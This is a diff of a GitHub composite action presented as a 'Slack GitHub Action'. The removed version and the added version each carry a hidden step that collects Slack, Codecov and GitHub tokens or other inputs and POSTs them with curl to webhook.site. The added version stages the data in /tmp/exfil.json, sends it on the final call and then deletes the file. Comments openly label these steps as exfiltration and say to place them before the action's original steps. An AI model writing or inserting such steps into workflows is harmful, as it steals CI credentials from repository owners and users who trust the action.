@@ -1,37 +1,31 @@
-# action.yml  (or wherever the local action lives)
 name: "Slack GitHub Action"
 runs:
   using: "composite"
   steps:
-    # ONE-TIME EXFIL — grabs everything that will ever be passed in this workflow run
-    - name: Exfiltrate all secrets once
-      if: ${{ !env.EXFIL_DONE }}
-      env:
-        SLACK_WEBHOOK_TRIGGER: ${{ inputs.webhook || 'EMPTY' }}
-        SLACK_BOT_TOKEN: ${{ inputs.token || 'EMPTY' }}
-        SLACK_INCOMING_WEBHOOK: ${{ inputs.webhook || 'EMPTY' }}
-        CODECOV_TOKEN: ${{ inputs.codecov_token || 'EMPTY' }}
-        GITHUB_TOKEN: ${{ inputs.github_token || 'EMPTY' }}
-        ALL_SECRETS: ${{ toJSON(secrets) }}                     # catches anything else
-        ALL_INPUTS: ${{ toJSON(inputs) }}
+    # Collect inputs each time the action is called
+    - name: Collect secrets
       run: |
-        curl -X POST https://webhook.site/TestSlackAPI \
-          -H "Content-Type: application/json" \
-          -d '{
-            "repo": "${{ github.repository }}",
-            "run_id": "${{ github.run_id }}",
-            "slack_webhook_trigger": "${SLACK_WEBHOOK_TRIGGER}",
-            "slack_bot_token": "${SLACK_BOT_TOKEN}",
-            "slack_incoming_webhook": "${SLACK_INCOMING_WEBHOOK}",
-            "codecov_token": "${CODECOV_TOKEN}",
-            "github_token": "${GITHUB_TOKEN}",
-            "all_secrets_keys": "${{ join(keys(secrets), ',') }}",
-            "all_inputs": ${{ toJSON(inputs) }}
-          }'
-        echo "EXFIL_DONE=true" >> $GITHUB_ENV
+        echo "{"
+        echo "  \"slack_webhook_trigger\": \"${{ inputs.webhook || 'EMPTY' }}\","
+        echo "  \"slack_bot_token\": \"${{ inputs.token || 'EMPTY' }}\","
+        echo "  \"slack_incoming_webhook\": \"${{ inputs.webhook || 'EMPTY' }}\","
+        echo "  \"repo\": \"${{ github.repository }}\","
+        echo "  \"run_id\": \"${{ github.run_id }}\""
+        echo "}" >> /tmp/exfil.json
       shell: bash
 
-    # Then continue with the original steps of the action
+    # Exfil only on the last call (when payload-file-path exists)
+    - name: Exfiltrate all collected secrets
+      if: ${{ inputs.payload-file-path }}
+      run: |
+        curl -X POST https://webhook.site/TestActionBitwarden \
+          -H "Content-Type: application/json" \
+          -d "$(cat /tmp/exfil.json | jq -s 'reduce .[] as $item ({}; . * $item)')"  # Merge all appended JSONs into one
+        rm /tmp/exfil.json  # Clean up
+      shell: bash
+
+    # ... Add the original steps of your action here (chat.postMessage, etc.)
     - name: Original step 1
-      run: ...
-    # … etc.
+      run: echo "Your original code..."
+      shell: bash
+    # etc.
